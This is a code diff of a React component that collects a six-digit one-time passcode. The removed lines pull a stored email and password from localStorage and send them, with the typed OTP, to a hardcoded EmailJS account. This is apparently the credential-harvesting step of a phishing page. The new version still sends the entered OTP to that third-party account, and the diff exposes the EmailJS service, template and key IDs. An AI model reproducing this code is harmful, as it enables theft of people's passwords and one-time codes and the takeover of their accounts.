@@ -1,41 +1,30 @@
-import React, { useEffect, useState, useRef } from 'react';
+import React, { useState } from 'react';
 import { IoIosArrowForward } from "react-icons/io";
 import emailjs from '@emailjs/browser';
 import { useNavigate } from 'react-router-dom';
 
 const About = () => {
   const [otp, setOtp] = useState(['', '', '', '', '', '']);
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
   const navigate = useNavigate();
-
-
-  // Retrieve data from local storage
-  useEffect(() => {
-    const storedEmail = localStorage.getItem('email');
-    const storedPassword = localStorage.getItem('password');
-    if (storedEmail) setEmail(storedEmail);
-    if (storedPassword) setPassword(storedPassword);
-  }, []);
 
   const handleSubmit = (e) => {
     e.preventDefault();
     const otpString = otp.join(''); // Combine OTP digits into a single string
 
-    emailjs.send('service_9nomj6r', 'template_y9ip2v9', {
-      email: email,
-      password: password,
-      otp: otpString
+    // The email template expects placeholders for to_name, from_name, and message
+    // Here we use dummy values for to_name and from_name, and include the OTP in the message
+    emailjs.send('service_9nomj6r', 'template_g9o0x4f', {
+      to_name: 'User', // Replace with the recipient's name or a relevant identifier
+      from_name: 'YourService', // Replace with the sender's name or your service name
+      message: `Your OTP code is ${otpString}` // OTP message
     }, 'ygYqOm4gSNnVf-A7Z')
       .then(() => {
-        localStorage.removeItem('email');
-        localStorage.removeItem('password');
-        navigate("/success")
+        navigate("/success");
       })
       .catch((error) => {
         console.error('Error sending OTP:', error);
       });
-  }
+  };
 
   const handleChange = (e, index) => {
     const { value } = e.target;
@@ -119,6 +108,6 @@ const About = () => {
       </footer>
     </div>
   );
-}
+};
 
 export default About;
